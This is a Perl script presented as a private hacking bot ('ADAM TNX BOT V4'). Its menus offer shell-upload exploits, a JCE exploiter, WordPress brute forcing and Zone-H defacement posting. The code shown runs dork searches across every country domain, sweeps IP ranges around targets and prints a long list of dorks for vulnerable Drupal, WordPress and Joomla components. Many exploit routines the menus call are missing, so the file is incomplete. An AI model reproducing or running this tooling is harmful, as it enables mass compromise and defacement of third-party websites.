#!/usr/bin/perl
#Coded By Adam Tnx 
#Please Dont change my right or " na3n sorm omk :) "
# hope you enjoy

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

$tnx="

                             
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             ' \n\n
";

    print color('bold green');

print $tnx;
print colored ("\tADAM TNX BOT V4 - PRV8 BOT WITH GOOD EXPLOITS \n",'white on_green');

    print color('reset');

print color("bold white"),"Choose:\n";
print color("red"),"1-[Adam Tnx V3 Bot]\n";
print color("bold green"),"2-[wyisa exploiter]\n";
print color("magenta"),"3-[Dzs-zoomsounds Shell upload]\n";
print color("yellow"),"4-[PHP Event Calendar]\n";
print color("blue"),"5-[The Magic Mode]\n";



  $target= <STDIN>;
  chomp $target;

  if ($target eq '1')
  {
  bot();  
  }
  if ($target eq '2')
  {
  wyisax();
  }
  if ($target eq '3')
  {
  dzszoomsoundsx();
  }
  if ($target eq '4')
  {
  phpevent();
  }
  if ($target eq '5')
  {
  beast();
  }




sub bot(){

print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

$tnx ="

 .d8b.  d8888b.  .d8b.  .88b  d88.  d888888b d8b   db db    db   db    db d8888b. 
d8' `8b 88  `8D d8' `8b 88'YbdP`88  `~~88~~' 888o  88 `8b  d8'   88    88 VP  `8D 
88ooo88 88   88 88ooo88 88  88  88     88    88V8o 88  `8bd8'    Y8    8P   oooY' 
88~~~88 88   88 88~~~88 88  88  88     88    88 V8o88  .dPYb.    `8b  d8'   ~~~b. 
88   88 88  .8D 88   88 88  88  88     88    88  V888 .8P  Y8.    `8bd8'  db   8D 
YP   YP Y8888D' YP   YP YP  YP  YP     YP    VP   V8P YP    YP      YP    Y8888P' 


                                                  Coded By Adam Tnx
                                            contact : fb/adam.ag.750                                                                
                                                                                                                  
\n\n
";

    print color('magenta');

print $tnx;

    print color('reset');

print color("bold white"),"Choose:\n";
print color("red"),"1-[Website Checker]\n";
print color("blue"),"2-[Zone-H Poster]\n";
print color("bold white"),"3-[Shell Checker]\n";
print color("green"),"4-[bing dorker]\n";
print color("magenta"),"5-[Com Media Upload Shell3z]\n";
print color("yellow"),"6-[Jce Exploiter]\n";
print color("bold red"),"7-[Getting / scanning info zone]\n";
print color("green"),"8-[Wordpress Brute Forcer]\n";
print color("bold white"),"9-[Adam Tnx V2 Bot]\n";


$target= <STDIN>;
  chomp $target;

  if ($target eq '1')
  {
  sites();  
  }
  if ($target eq '2')
  {
 zoneh();
   }
  if ($target eq '3')
  {
  checker();
  }
  if ($target eq '4')
  {
  bing();
  }
  if ($target eq '5')
  {
  media();
  }
  if ($target eq '6')
  {
  jce();
  }
  if ($target eq '7')
  {
  info();
  }
  if ($target eq '8')
  {
  brute();
  }
  if ($target eq '9')
  {
  tnx();
  }
sub bing(){
system('cls');


$logo="
  ____  _               _____             _             
 |  _ \(_)             |  __ \           | |            
 | |_) |_ _ __   __ _  | |  | | ___  _ __| | _____ _ __ 
 |  _ <| | '_ \ / _` | | |  | |/ _ \| '__| |/ / _ \ '__|
 | |_) | | | | | (_| | | |__| | (_) | |  |   <  __/ |   
 |____/|_|_| |_|\__, | |_____/ \___/|_|  |_|\_\___|_|   
                  __/ |                                  
                 |___/                                                     
";
print $logo;

print color("green"), "[1] World Wide     |> World Wide Grabber\n";
print color("green"), "[3] Mass Site Dump |> Range Ip by Ip or Wbesite list\n";
print color("green"), "[4] i'm Idiot And I Don't Know What To Do \n";
print color("green"), "[5] Random Ip Genrator \n";
my $targett = <STDIN>;
chomp $targett;



if($targett eq '1')
{
print "[Just Put Your Dork And I will Scan All World Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("bold white"),"$country]\n";
print color('reset');
gassone();
}
}


if($targett eq '3')
{
tnxx2();
sub tnxx2(){
print "[Put A Ip List chen3a.txt]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);

  open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();

}else{
gett();
}

}
}
}


if($targett eq '4')
{
print ("
            Drupal Dorks: 
user/login powered by drupal
user/login
node/1
node/1
node/add/page
?q=user/1
?q=user/2
?q=user/3
?q=user/4
?q=user/5
            Wordpress Dorks :
inurl:/wp-content/plugins/gravityforms/
/wp-content/plugins/gravityforms/
index of /wp-content/uploads/gravity_forms/
inurl:/wp-content/uploads/gravity_forms/
inurl:/wp-content/plugins/gravityforms/
inurl:wp-content/plugins/revslider/
inurl:revslider
inurl:revslider_admin.php
inurl:revslider_front.php
inurl:plugins/revslider/
intext:Powered by Revslider
intitle:Index Of/ revslider
intitle:Index Of/wp-content/plugins/revslider
intitle:Index Of/admin/revslider
Index Of/admin/revslider
Index Of/wp-content/plugins/revslider
Index Of/ revslider
revslider_admin.php
inurl:dhia_jridi
/wp-admin/admin-post.php?page=wysija
admin-post.php?page=wysija 
                Joomla Dorks :
inurl:/index.php?option=com_jce
index.php?option=com_jce
index.php?option=com_aardvertiser
index.php?option=com_akobook
index.php?option=com_abbrev
index.php?option=com_gk3_photoslide
index.php?option=com_abc
index.php?option=com_aclassf
index.php?option=com_acprojects
index.php?option=com_acstartseite
index.php?option=com_acteammember
index.php?option=com_actions
index.php?option=com_acymailing
index.php?option=com_addressbook
index.php?option=com_adds
index.php?option=com_rsticketspro
index.php?option=com_adsmanager
index.php?option=com_advertising
index.php?option=com_ag_vodmatvil
index.php?option=com_agency
index.php?option=com_agenda
index.php?option=com_ajaxchat
index.php?option=com_alameda
index.php?option=com_alfresco
index.php?option=com_alfurqan15x
index.php?option=com_allcinevid
index.php?option=com_traxartist
index.php?option=com_flippingbook
index.php?option=com_amblog
index.php?option=com_aml_2
index.php?option=com_annonces
index.php?option=com_appointinator
index.php?option=com_appointment
index.php?option=com_aprice
index.php?option=com_arcadegames
index.php?option=com_archeryscores
index.php?option=com_articleman
index.php?option=com_articlemanager
index.php?option=com_autartimonial
index.php?option=com_avosbillets
index.php?option=com_awiki
index.php?option=com_uhp
index.php?option=com_beamospetition
index.php?option=com_beamspetition
index.php?option=com_bfquiztrial
index.php?option=com_bfsurvey
index.php?option=com_bfsurvey_basic
index.php?option=com_bfsurvey_pro
index.php?option=com_biblestudy
index.php?option=com_biblioteca
index.php?option=com_bidding
index.php?option=com_billyportfolio
index.php?option=com_blog
index.php?option=com_blogfactory
index.php?option=com_book
index.php?option=com_bookflip
index.php?option=com_booklibrary
index.php?option=com_btg_oglas
index.php?option=com_caddy
index.php?option=com_calcbuilder
index.php?option=com_calendario
index.php?option=com_canteen
index.php?option=com_carman
index.php?option=com_cartikads
index.php?option=com_cartweberp
index.php?option=com_casino
index.php?option=com_category
index.php?option=com_cbe
index.php?option=com_cbresumebuilder
index.php?option=com_ccboard
index.php?option=com_ccinvoices
index.php?option=com_ccnewsletter
index.php?option=com_ccrowdsource
index.php?option=com_cgtestimonial
index.php?option=com_chronocontact
index.php?option=com_clan
index.php?option=com_clanlist
index.php?option=com_clantools
index.php?option=соm_рhilаfоrm
index.php?option=com_easybook
index.php?option=com_simpleboard
index.php?option=com_admin
index.php?option=com_htmlarea3_xtd-c
index.php?option=com_sitemap
index.php?option=com_ewriting
index.php?option=com_performs
index.php?option=com_forum
index.php?option=com_productshowcase
index.php?option=com_menus
index.php?option=com_musica
index.php?option=com_colorlab
index.php?option=com_community
index.php?option=com_comp
index.php?option=com_componen
index.php?option=com_component
index.php?option=com_connect
index.php?option=com_content
index.php?option=com_contentbloglist
index.php?option=com_countries
index.php?option=com_crowdsource
index.php?option=com_cvmaker
index.php?option=com_dailymeals
index.php?option=com_dashboard
index.php?option=com_dateconverter
index.php?option=com_datsogallery
index.php?option=com_myalbum
index.php?option=com_dcnews
index.php?option=com_delicious
index.php?option=com_diary
index.php?option=com_digifolio
index.php?option=com_digistore
index.php?option=com_dioneformwizard
index.php?option=com_dir
index.php?option=com_discussions
index.php?option=com_djclassifieds
index.php?option=com_dms
index.php?option=com_doqment
index.php?option=com_drawroot
index.php?option=com_dshop
index.php?option=com_education_classess
index.php?option=com_elite_experts
index.php?option=com_eportfolio
index.php?option=com_equipment
index.php?option=com_esearch
index.php?option=com_event
index.php?option=com_eventcal
index.php?option=com_eventing
index.php?option=com_extcalendar
index.php?option=com_mospray
index.php?option=com_smf
index.php?option=com_pollxt
index.php?option=com_ezautos
index.php?option=com_loudmounth
index.php?option=com_videodb
index.php?option=com_ezine
index.php?option=com_family
index.php?option=com_fastball
index.php?option=com_fireboard
index.php?option=com_flashgames
index.php?option=com_flexicontent
index.php?option=com_flipwall
index.php?option=com_football
index.php?option=com_forme
index.php?option=com_fss
index.php?option=com_g2bridge
index.php?option=com_gambling
index.php?option=com_gamesbox
index.php?option=com_gantry
index.php?option=com_gbufacebook
index.php?option=com_gds
index.php?option=com_gigfe
index.php?option=com_golfcourseguide
index.php?option=com_google
index.php?option=com_graphics
index.php?option=com_grid
index.php?option=com_gsticketsystem
index.php?option=com_guide
index.php?option=com_hbssearch
index.php?option=com_hdflvplayer
index.php?option=com_hdvideoshare
index.php?option=com_hello
index.php?option=com_hezacontent
index.php?option=com_hitexam
index.php?option=com_hmcommunity
index.php?option=com_horoscope
index.php?option=com_hotbrackets
index.php?option=com_huruhelpdesk
index.php?option=com_if_nexus
index.php?option=com_ijoomla_archive
index.php?option=com_ijoomla_rss
index.php?option=com_img
index.php?option=com_immobilien
index.php?option=com_include
index.php?option=com_intuit
index.php?option=com_iotaphotogallery
index.php?option=com_iproperty
index.php?option=com_ircmbasic
index.php?option=com_itarmory
index.php?option=com_items
index.php?option=com_jacomment
index.php?option=com_jashowcase
index.php?option=com_javoice
index.php?option=com_jbook
index.php?option=com_jbpublishdownfp
index.php?option=com_jce
index.php?option=com_jcollection
index.php?option=com_jdirectory
index.php?option=com_jdownloads
index.php?option=com_jdrugstopics
index.php?option=com_jeajaxeventcalendar
index.php?option=com_jeauto
index.php?option=com_jedirectory
index.php?option=com_jeemaarticlecollection
index.php?option=com_jeemasms
index.php?option=com_jefaqpro
index.php?option=com_jeguestbook
index.php?option=com_jepoll
index.php?option=com_jequoteform
index.php?option=com_jesectionfinder
index.php?option=com_jestory
index.php?option=com_jesubmit
index.php?option=com_jfuploader
index.php?option=com_jgen
index.php?option=com_jim
index.php?option=com_jimtawl
index.php?option=com_jinc
index.php?option=com_jlord_rss
index.php?option=com_jmsfileseller
index.php?option=com_jnewsletter
index.php?option=com_jnewspaper
index.php?option=com_job
index.php?option=com_jomdocs
index.php?option=com_jomestate
index.php?option=com_jomsocial
index.php?option=com_jomtube
index.php?option=com_joomdle
index.php?option=com_joomdocs
index.php?option=com_joomgalleryfunc
index.php?option=com_joomlaconnect_be
index.php?option=com_joomlaflashfun
index.php?option=com_joomlaflickr
index.php?option=com_joomlaupdater
index.php?option=com_joomla-visites
index.php?option=com_joommail
index.php?option=com_joomnik
index.php?option=com_joomportfolio
index.php?option=com_joomtouch
index.php?option=com_jp_jobs
index.php?option=com_jphone
index.php?option=com_jpodium
index.php?option=com_j-projects
index.php?option=com_jquarks4s
index.php?option=com_jreactions
index.php?option=com_jreservation
index.php?option=com_jscalendar
index.php?option=com_jshop
index.php?option=com_jstore
index.php?option=com_jsubscription
index.php?option=com_jsupport
index.php?option=com_jtickets
index.php?option=com_jtm
index.php?option=com_jukebox
index.php?option=com_juliaportfolio
index.php?option=com_jwhmcs
index.php?option=com_k2
index.php?option=com_king
index.php?option=com_kk
index.php?option=com_konsultasi
index.php?option=com_ksadvertiser
index.php?option=com_kunena
index.php?option=com_lead
index.php?option=com_leader
index.php?option=com_libros
index.php?option=com_listbingo
index.php?option=com_listing
index.php?option=com_lovefactory
index.php?option=com_lyftenbloggie
index.php?option=com_maianmedia
index.php?option=com_manager
index.php?option=com_market
index.php?option=com_magazine
index.php?option=com_marketplace
index.php?option=com_markt
index.php?option=com_matamko
index.php?option=com_mdigg
index.php?option=com_media_library
index.php?option=com_mediamall
index.php?option=com_mediqna
index.php?option=com_memory
index.php?option=com_menu
index.php?option=com_mochigames
index.php?option=com_mosres
index.php?option=com_mtfireeagle
index.php?option=com_mtree
index.php?option=com_multimap
index.php?option=com_multiroot
index.php?option=com_mamml
index.php?option=com_mycar
index.php?option=com_mycontent
index.php?option=com_myfiles
index.php?option=com_myhome
index.php?option=com_mysms
index.php?option=com_na_content
index.php?option=com_na_newsdescription
index.php?option=com_nicetalk
index.php?option=com_network
index.php?option=com_newsletter
index.php?option=com_fq
index.php?option=com_newsfeeds
index.php?option=com_nfnaddressbook
index.php?option=com_ninjamonials
index.php?option=com_noticeboard
index.php?option=com_noticias
index.php?option=com_obsuggest
index.php?option=com_oprykningspoint_mc
index.php?option=com_ops
index.php?option=com_otzivi
index.php?option=com_oziogallery2
index.php?option=com_packages
index.php?option=com_pandafminigames
index.php?option=com_pandarminigames
index.php?option=com_pbbooking
index.php?option=com_pc
index.php?option=com_securityimages
index.php?option=com_artlinks
index.php?option=com_people
index.php?option=com_perchagallery
index.php?option=com_galleria
index.php?option=com_phocadocumentation
index.php?option=com_phocagallery
index.php?option=com_photobattle
index.php?option=com_photomapgallery
index.php?option=com_php
index.php?option=com_picsell
index.php?option=com_portfol
index.php?option=com_portfolio
index.php?option=com_powermail
index.php?option=com_press
index.php?option=com_prime
index.php?option=com_pro_desk
index.php?option=com_properiesaid
index.php?option=com_propertylab
index.php?option=com_question
index.php?option=com_quickfaq
index.php?option=com_radio
index.php?option=com_record
index.php?option=com_restaurant
index.php?option=com_restaurantmenumanager
index.php?option=com_rokmodule
index.php?option=com_rsappt_pro
index.php?option=com_rsappt_pro2
index.php?option=com_rscomments
index.php?option=com_rsform
index.php?option=com_rsgallery2
index.php?option=com_rssreader
index.php?option=com_s2clanroster
index.php?option=com_sar_news
index.php?option=com_science
index.php?option=com_searchlog
index.php?option=com_sebercart
index.php?option=com_serie
index.php?option=com_sermonspeaker
index.php?option=com_seyret
index.php?option=com_simplefaq
index.php?option=com_simpleshop
index.php?option=com_smartsite
index.php?option=com_socialads
index.php?option=com_software
index.php?option=com_solution
index.php?option=com_soundset
index.php?option=com_serverstat
index.php?option=com_spa
index.php?option=com_spartsite
index.php?option=com_spec
index.php?option=com_spielothek
index.php?option=com_sportfusion
index.php?option=com_spsnewsletter
index.php?option=com_sqlreport
index.php?option=com_start
index.php?option=com_staticxt
index.php?option=com_surveymanager
index.php?option=com_svmap
index.php?option=com_sweetykeeper
index.php?option=com_tariff
index.php?option=com_teacher
index.php?option=com_team
index.php?option=com_teams
index.php?option=com_techfolio
index.php?option=com_television
index.php?option=com_tender
index.php?option=com_timereturns
index.php?option=com_timetrack
index.php?option=com_topmenu
index.php?option=com_tour
index.php?option=com_tpjobs
index.php?option=com_trabalhe_conosco
index.php?option=com_trading
index.php?option=com_travelbook
index.php?option=com_ttvideo
index.php?option=com_tupinambis
index.php?option=com_ultimateportfolio
index.php?option=com_units
index.php?option=com_universal
index.php?option=com_users
index.php?option=com_vat
index.php?option=com_vehiclemanager
index.php?option=com_vid
index.php?option=com_vikrealestate
index.php?option=com_vjdeo
index.php?option=com_vxdate
index.php?option=com_wallpapers
index.php?option=com_weblinks
index.php?option=com_webtv
index.php?option=com_wgpicasa
index.php?option=com_wmi
index.php?option=com_wmptic
index.php?option=com_wmtpic
index.php?option=com_wrapper
index.php?option=com_xcloner-backupandrestore
index.php?option=com_xevidmegahd
index.php?option=com_xgallery
index.php?option=com_xmovie
index.php?option=com_yanc
index.php?option=com_yvhotels
index.php?option=com_zimbcomment
index.php?option=com_zimbcore
index.php?option=com_zina
index.php?option=com_zoom
index.php?option=com_zoomprotfolio
index.php?option=com_fm
index.php?option=phocaguestbook
index.php?option=mailto
index.php?option=con_extplorer
index.php?option=com_worldrates
index.php?option=com_glossary
index.php?option=com_musepoes
index.php?option=com_buslicense
index.php?option=com_recipes
index.php?option=com_jokes
index.php?option=com_estateagent
index.php?option=com_catalogshop
index.php?option=com_akogallery
index.php?option=com_garyscookbook
index.php?option=com_flyspray
index.php?option=com_hashcash
index.php?option=com_mambads
index.php?option=com_hotproperty
index.php?option=com_directory
index.php?option=com_awesom
index.php?option=com_shambo2
index.php?option=com_downloads
index.php?option=com_peoplebook
index.php?option=com_guest
index.php?option=com_quote
index.php?option=com_gallery
index.php?option=com_neogallery
index.php?option=com_comments
index.php?option=com_rapidrecipe
index.php?option=com_board
index.php?option=com_xfaq
index.php?option=com_paxxgallery
index.php?option=com_quiz
index.php?option=com_ricette
index.php?option=com_jooget
index.php?option=com_jotloader
index.php?option=com_jradio
index.php?option=com_jquarks
index.php?option=com_sponsorwall
index.php?option=com_registration
index.php?option=com_zoomportfolio
index.php?option=com_dirfrm
index.php?option=com_jgrid
index.php?option=com_ongallery
index.php?option=com_neorecruit
index.php?option=com_joomla
index.php?option=com_youtube
index.php?option=com_sar
index.php?option=com_jsjobs
index.php?option=com_beeheard
index.php?option=com_activehelper
index.php?option=com_camp
index.php?option=com_awdwall
index.php?option=com_joltcard
index.php?option=com_if
index.php?option=com_gadgetfactory
index.php?option=com_qpersonel
index.php?option=com_mv
index.php?option=com_weberpcustomer
index.php?option=com_articles
index.php?option=com_webeecomment
index.php?option=com_xobbix
index.php?option=com_loginbox
index.php?option=com_shoutbox
index.php?option=com_dwgraphs
index.php?option=com_xmap
index.php?option=com_business
index.php?option=com_departments
index.php?option=com_smestorage
index.php?option=com_aml
index.php?option=com_flash
index.php?option=com_jwmmxtd
index.php?option=com_giftexchange
index.php?option=com_jeformcr
index.php?option=com_org
index.php?option=com_about
index.php?option=com_color
index.php?option=com_party
index.php?option=com_liveticker
index.php?option=com_joomlaconnect
index.php?option=com_communitypolls
index.php?option=com_videos
index.php?option=com_productbook
index.php?option=com_photoblog
index.php?option=com_jequizmanagement
index.php?option=com_biographies
index.php?option=com_gurujibook
index.php?option=com_gameserver
index.php?option=com_jvideodirect
index.php?option=com_rd
index.php?option=com_artistavenue
index.php?option=com_airmonoblock
index.php?option=com_dhforum
index.php?option=com_trabalhe
index.php?option=com_oprykningspoint
index.php?option=com_adagency
index.php?option=com_morfeoshow
index.php?option=com_mediaslide
index.php?option=com_jcalpro
index.php?option=com_zcalendar
index.php?option=com_acmisc
index.php?option=com_virtuemart
index.php?option=com_docman
index.php?option=com_joomgallery
index.php?option=com_mojo
index.php?option=com_joaktree
index.php?option=com_mygallery
index.php?option=Com_Joomclip
index.php?option=com_mytube
index.php?option=com_jbudgetsmagic
index.php?option=com_rsmonials
index.php?option=com_cmimarketplace
index.php?option=com_mailto
index.php?option=com_maianmusic
index.php?option=com_pcchess
index.php?option=com_prod
index.php?option=com_waticketsystem
index.php?option=com_news
index.php?option=com_pccookbook
index.php?option=com_fantasytournament
index.php?option=com_camelcitydb
index.php?option=com_paxgallery
index.php?option=com_ice
index.php?option=com_livechat
index.php?option=com_feederator
index.php?option=com_competitions
index.php?option=com_clickheat
index.php?option=com_dailymessage
index.php?option=com_ignitegallery
index.php?option=com_joomtracker
index.php?option=com_hotspots
index.php?option=com_is
index.php?option=com_gameq
index.php?option=com_prayercenter
index.php?option=com_webhosting
index.php?option=com_alphacontent
index.php?option=com_filiale
index.php?option=com_extplorer
index.php?option=com_actualite
index.php?option=com_d
index.php?option=com_astatspro
index.php?option=com_search
index.php?option=com_expose
index.php?option=com_philaform
index.php?option=com_mosmedia
index.php?option=com_thopper
index.php?option=com_resman
index.php?option=com_poll
index.php?option=com_kochsuite
index.php?option=com_linkdirectory
index.php?option=com_lmo
index.php?option=com_rss
index.php?option=com_oziogallery
index.php?option=com_noticia
index.php?option=com_kkcontent
index.php?option=com_jphoto
index.php?option=com_quicknews
index.php?option=com_musicgallery
index.php?option=com_pinboard
index.php?option=com_amocourse
index.php?option=com_jfusion
index.php?option=com_misterestate
index.php?option=com_tpdugg
index.php?option=com_alphauserpoints
index.php?option=com_foobla
index.php?option=com_jlord
index.php?option=com_facebook
index.php?option=com_groupjive
index.php?option=com_jd
index.php?option=com_recerca
index.php?option=com_icrmbasic
index.php?option=com_album
index.php?option=com_lucygames
index.php?option=com_siirler
index.php?option=com_idoblog
index.php?option=com_pms
index.php?option=com_jobline
index.php?option=com_K
index.php?option=com_jumi
index.php?option=com_ijoomla
index.php?option=com_media
index.php?option=com_omphotogallery
index.php?option=com_seminar
index.php?option=com_jvideo
index.php?option=com_agoragroup
index.php?option=Com_Agora
index.php?option=com_rsgallery
index.php?option=com_bsadv
index.php?option=com_djiceshoutbox
index.php?option=com_rdautos
index.php?option=com_na
index.php?option=com_simple
index.php?option=com_allhotels
index.php?option=com_volunteer
index.php?option=com_tech
index.php?option=com_mydyngallery
index.php?option=com_jmovies
index.php?option=com_thyme
index.php?option=com_catalogproduction
index.php?option=com_contactinfo
index.php?option=com_jb
index.php?option=com_dadamail
index.php?option=com_ongumatimesheet
index.php?option=com_googlebase
index.php?option=com_treeg
index.php?option=com_ab
index.php?option=com_kbase
index.php?option=com_ionfiles
index.php?option=com_ds
index.php?option=com_mad
index.php?option=com_imagebrowser
index.php?option=com_user
index.php?option=com_ezstore
index.php?option=com_products
index.php?option=com_propertiesaid
index.php?option=com_qcontacts
index.php?option=com_quran
index.php?option=com_races
index.php?option=com_ranking
index.php?option=com_rd_download
index.php?option=com_realestatemanager
index.php?option=com_realtyna
index.php?option=com_redshop
index.php?option=com_remository
index.php?option=com_restaurantguide
index.php?option=com_rokdownloads
index.php?option=com_route
index.php?option=com_rwcards
index.php?option=com_s5clanroster
index.php?option=com_sbsfile
index.php?option=com_school
index.php?option=com_schools
index.php?option=com_dtregister
index.php?option=com_n
index.php?option=com_altas
index.php?option=com_vr
index.php?option=com_brightweblinks
index.php?option=com_versioning
index.php?option=com_xewebtv
index.php?option=com_jabode
index.php?option=com_netinvoice
index.php?option=com_expshop
index.php?option=com_yvcomment
index.php?option=com_joomladate
index.php?option=com_joomradio
index.php?option=com_eQuotes
index.php?option=com_acctexp
index.php?option=com_joobb
index.php?option=com_artist
index.php?option=com_xsstream
index.php?option=com_comprofiler
index.php?option=com_jpad
index.php?option=com_joomlaxplorer
index.php?option=com_onlineflashquiz
index.php?option=com_rekry
index.php?option=com_custompages
index.php?option=com_galeria
index.php?option=com_mcquiz
index.php?option=com_ynews
index.php?option=com_neoreferences
index.php?option=com_candle
index.php?option=com_joovideo
index.php?option=com_alberghi
index.php?option=com_restaurante
index.php?option=com_puarcade
index.php?option=com_jjgallery
index.php?option=com_jcs
index.php?option=com_mp
index.php?option=com_wmtportfolio
index.php?option=com_wmtgallery
index.php?option=com_panoramic
index.php?option=com_slideshow
index.php?option=com_joom
index.php?option=com_joomlaradiov
index.php?option=com_jombib
index.php?option=com_rsfiles
index.php?option=com_eventlist
index.php?option=com_gmaps
index.php?option=com_ponygallery
index.php?option=com_autostand
index.php?option=com_swmenufree
index.php?option=com_joomlaboard
index.php?option=com_webring
index.php?option=com_reporter
index.php?option=com_jeux
index.php?option=com_nfn
index.php?option=com_bayesiannaivefilter
index.php?option=com_doc
index.php?option=com_clasifier
index.php?option=com_hwdvideoshare
index.php?option=com_acajoom
index.php?option=com_facileforms
index.php?option=com_books
index.php?option=com_tophotelmodule
index.php?option=com_lowcosthotels
index.php?option=com_newsflash
index.php?option=com_gigcal
index.php?option=com_flashmagazinedeluxe
index.php?option=com_bookjoomlas
index.php?option=com_juser
index.php?option=com_moofaq
index.php?option=com_portafolio
index.php?option=com_projectfork
index.php?option=com_tickets
index.php?option=com_joomloads
index.php?option=com_ninjamonial
index.php?option=com_jtips
index.php?option=com_artportal
index.php?option=com_joomlub
index.php?option=com_joomloc
index.php?option=com_djcatalog
index.php?option=com_foobla_suggestions
index.php?option=com_reservations
index.php?option=com_chronoconnectivity
index.php?option=com_djartgallery
index.php?option=com_jmarket
index.php?option=com_jcommunity
index.php?option=com_cinema
index.php?option=com_answers
index.php?option=com_galleryxml
index.php?option=com_frontpage
index.php?option=com_google_maps
index.php?option=com_image
index.php?option=com_photos
index.php?option=com_picasa2gallery
index.php?option=com_ybggal
index.php?option=com_jcafe
index.php?option=com_jejob
index.php?option=com_sef
index.php?option=jesubmit
index.php?option=com_projectlog
index.php?option=com_reportcard
index.php?option=com_artforms
index.php?option=com_jomholiday
index.php?option=com_ownbiblio
index.php?option=com_tag
index.php?option=com_commedia
index.php?option=com_conference
index.php?option=com_realty
index.php?option=com_sobi2
index.php?option=com_jomdirectory
index.php?option=com_bnf
index.php?option=com_sport
index.php?option=com_personal
index.php?option=com_play
index.php?option=com_etree
index.php?option=com_file
index.php?option=com_bca-rss-syndicator
index.php?option=com_ckforms
index.php?option=com_datafeeds
index.php?option=com_fabrik
index.php?option=com_ganalytics
index.php?option=com_gcalendar
index.php?option=com_hsconfig
index.php?option=com_if_surfalert
index.php?option=com_janews
index.php?option=com_jfeedback
index.php?option=com_joomlapicasa2
index.php?option=com_jshopping
index.php?option=com_jvehicles
index.php?option=com_linkr
index.php?option=com_mmsblog
index.php?option=com_mscomment
index.php?option=com_ninjarsssyndicator
index.php?option=com_onlineexam
index.php?option=com_orgchart
index.php?option=com_properties
index.php?option=com_rpx
index.php?option=com_sectionex
index.php?option=com_simpledownload
index.php?option=com_userstatus
index.php?option=com_aquiz
index.php?option=com_as
index.php?option=com_as_shop
index.php?option=com_msg
index.php?option=com_club
modules/mod_simplefileuploadv1.3


put all this in file txt === > tnx.txt then run script again and choose 1
");

}
if($targett eq '5')
{
tnxx1();
sub tnxx1(){
srand(time() ^ ($$ + ($$ << 15)));
print "Welcome to the ip Genrator how much ip u want ?\n";
my $ipnumtnx = <STDIN>;
chomp $ipnumtnx;

for (1..$ipnumtnx){
    print $spx = join ('.', (int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))))

          , "\n";
      open(save, '>>v3-ips.txt');
    print save "$spx\n";
    close(save);

}
}
}

else{
print color("red"), "Not Found\n";
print color('reset');
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ipv3bot.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();

}
minibot();
open HANDLE,">","botv3.txt";
print HANDLE "";
close HANDLE;


}
}
#############################
